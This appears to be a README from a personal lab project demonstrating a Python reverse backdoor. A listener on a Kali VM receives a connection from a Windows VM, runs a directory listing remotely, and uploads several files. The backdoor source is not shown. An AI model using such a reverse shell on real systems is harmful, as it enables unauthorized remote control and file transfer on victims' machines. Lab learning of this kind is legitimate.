# Backdoor

## Kicking the Tyres

On the Kali VM:
```shell
backdoor$ python3 listener.py
[+] Listening on 192.168.122.108:4444
```

On the Windows VM

```shell
backdoor> ..\venv\Scripts\python.exe .\reverse_backdoor.py
```

```shell
[+] Accepted connection from 192.168.122.63:51872
>> dir
 Volume in drive C has no label.
 Volume Serial Number is 2CEC-EEFF

 Directory of C:\Users\Nina\PycharmProjects\ymrir\backdoor

31/01/2022  22:52    <DIR>          .
31/01/2022  22:52    <DIR>          ..
31/01/2022  22:45             2,467 listener.py
31/01/2022  17:00                10 README.md
31/01/2022  22:52             2,610 reverse_backdoor.py
               3 File(s)          5,087 bytes
               2 Dir(s)   2,133,176,320 bytes free

>> upload madeit.jpg
[+] Upload Succesful
>> upload sortir.txt
[+] Upload Succesful
>> upload sortir.pdf
[+] Upload Succesful
>> exit
                                         
```